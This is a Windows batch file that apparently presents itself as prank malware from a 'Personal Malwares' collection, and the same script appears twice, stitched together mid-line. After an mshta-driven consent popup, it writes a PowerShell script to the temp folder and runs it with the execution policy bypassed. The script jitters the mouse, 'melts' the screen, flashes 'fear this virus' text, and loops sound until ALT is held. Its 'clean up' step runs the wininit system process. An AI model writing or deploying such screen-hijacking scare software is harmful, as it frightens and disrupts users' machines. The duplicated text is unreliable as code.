@echo off
:: 1. THE CUSTOM WARNING
set "msg=If you click OK the virus will start, if you risk it, press it. - Personal Malwares"
set "title=System Alert"
powershell -Command "if ((mshta 'vbscript:Execute(\"result=msgbox(\"\"%msg%\"\",1+48,\"\"%title%\"\"):close:set fso=createobject(\"\"scripting.filesystemobject\"\"):fso.getstandardstream(1).write result\")') -eq '2') { exit }"

:: 2. THE CHAOS SCRIPT
set "ps_script=%temp%\chaos_audio.ps1"

echo Add-Type -AssemblyName System.Windows.Forms > "%ps_script%"
echo Add-Type -AssemblyName System.Drawing >> "%ps_script%"
echo $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width >> "%ps_script%"
echo $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height >> "%ps_script%"
echo $g = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero) >> "%ps_script%"
echo $icon = [System.Drawing.SystemIcons]::Error >> "%ps_script%"

echo # Sound Setup >> "%ps_script%"
echo $soundPath = Join-Path $home "Downloads\sound.wav" >> "%ps_script%"
echo $player = New-Object System.Media.SoundPlayer($soundPath) >> "%ps_script%"
echo # Start the looping audio immediately >> "%ps_script%"
echo try { if (Test-Path $soundPath) { $player.PlayLooping() } } catch {} >> "%ps_script%"

echo # Text Setup >> "%ps_script%"
echo $font = New-Object System.Drawing.Font("Impact", 30, [System.Drawing.FontStyle]::Bold) >> "%ps_script%"
echo $phrases = @("Halvia", "regret what you have done", "fear this virus") >> "%ps_script%"

echo while ($true) { >> "%ps_script%"
echo     if ([System.Windows.Forms.Control]::ModifierKeys -eq 'Alt') { >> "%ps_script%"
echo         $player.Stop() >> "%ps_script%"
echo         break >> "%ps_script%"
echo     } >> "%ps_script%"
echo     # MOUSE JITTER >> "%ps_script%"
echo     $pos = [System.Windows.Forms.Cursor]::Position >> "%ps_script%"
echo     $jx = (Get-Random -Min -15 -Max 16) >> "%ps_script%"
echo     $jy = (Get-Random -Min -15 -Max 16) >> "%ps_script%"
echo     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + $jx), ($pos.Y + $jy)) >> "%ps_script%"
echo     # RANDOM COLOR GENERATOR >> "%ps_script%"
echo     $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb((Get-Random -Max 256), (Get-Random -Max 256), (Get-Random -Max 256))) >> "%ps_script%"
echo     # MELT EFFECT >> "%ps_script%"
echo     $x = Get-Random -Min 0 -Max $w >> "%ps_script%"
echo     $g.CopyFromScreen($x, 0, $x, 10, (New-Object System.Drawing.Size((Get-Random -Min 10 -Max 100), $h))) >> "%ps_script%"
echo     # TEXT SPAM >> "%ps_script%"
echo     $g.DrawString($phrases[(Get-Random -Min 0 -Max 3)], $font, $brush, (Get-Random -Max ($w - 300)), (Get-Random -Max ($h - 50))) >> "%ps_script%"
echo     # DRAW CRITICAL ICON >> "%ps_script%"
echo     $g.DrawIcon($icon, $pos.X - 16, $pos.Y - 16) >> "%ps_script%"
echo     $brush.Dispose() >> "%ps_script%"
echo     Start-Sleep -m 50 # Balanced speed to prevent system crash >> "%ps_script%"
echo } >> "%ps_script%"

echo [CHAOS ACTIVE] - HOLD [ALT] TO STOP.
powershell -NoProfile -ExecutionPolicy Bypass -File "%ps_script%"

:: 3. CLEAN UP
wininit
pause@echo off
:: 1. THE CUSTOM WARNING
set "msg=If you click OK the virus will start, if you risk it, press it. - Personal Malwares"
set "title=System Alert"
powershell -Command "if ((mshta 'vbscript:Execute(\"result=msgbox(\"\"%msg%\"\",1+48,\"\"%title%\"\"):close:set fso=createobject(\"\"scripting.filesystemobject\"\"):fso.getstandardstream(1).write result\")') -eq '2') { exit }"

:: 2. THE CHAOS SCRIPT
set "ps_script=%temp%\chaos_audio.ps1"

echo Add-Type -AssemblyName System.Windows.Forms > "%ps_script%"
echo Add-Type -AssemblyName System.Drawing >> "%ps_script%"
echo $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width >> "%ps_script%"
echo $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height >> "%ps_script%"
echo $g = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero) >> "%ps_script%"
echo $icon = [System.Drawing.SystemIcons]::Error >> "%ps_script%"

echo # Text Setup >> "%ps_script%"
echo $font = New-Object System.Drawing.Font("Impact", 30, [System.Drawing.FontStyle]::Bold) >> "%ps_script%"
echo $phrases = @("Halvia", "regret what you have done", "fear this virus") >> "%ps_script%"

echo while ($true) { >> "%ps_script%"
echo     if ([System.Windows.Forms.Control]::ModifierKeys -eq 'Alt') { break } >> "%ps_script%"
echo     # VIRUS AUDIO (Rapid high-pitched beeps) >> "%ps_script%"
echo     [System.Console]::Beep((Get-Random -Min 400 -Max 2000), 50) >> "%ps_script%"
echo     # MOUSE JITTER >> "%ps_script%"
echo     $pos = [System.Windows.Forms.Cursor]::Position >> "%ps_script%"
echo     $jx = (Get-Random -Min -15 -Max 16) >> "%ps_script%"
echo     $jy = (Get-Random -Min -15 -Max 16) >> "%ps_script%"
echo     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + $jx), ($pos.Y + $jy)) >> "%ps_script%"
echo     # RANDOM COLOR GENERATOR >> "%ps_script%"
echo     $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb((Get-Random -Max 256), (Get-Random -Max 256), (Get-Random -Max 256))) >> "%ps_script%"
echo     # MELT EFFECT >> "%ps_script%"
echo     $x = Get-Random -Min 0 -Max $w >> "%ps_script%"
echo     $g.CopyFromScreen($x, 0, $x, 10, (New-Object System.Drawing.Size((Get-Random -Min 10 -Max 100), $h))) >> "%ps_script%"
echo     # TEXT SPAM >> "%ps_script%"
echo     $g.DrawString($phrases[(Get-Random -Min 0 -Max 3)], $font, $brush, (Get-Random -Max ($w - 300)), (Get-Random -Max ($h - 50))) >> "%ps_script%"
echo     # DRAW CRITICAL ICON >> "%ps_script%"
echo     $g.DrawIcon($icon, $pos.X - 16, $pos.Y - 16) >> "%ps_script%"
echo     $brush.Dispose() >> "%ps_script%"
echo } >> "%ps_script%"

echo [CHAOS ACTIVE] - HOLD [ALT] TO STOP.
powershell -NoProfile -ExecutionPolicy Bypass -File "%ps_script%"

:: 3. CLEAN UP
wininit
pause

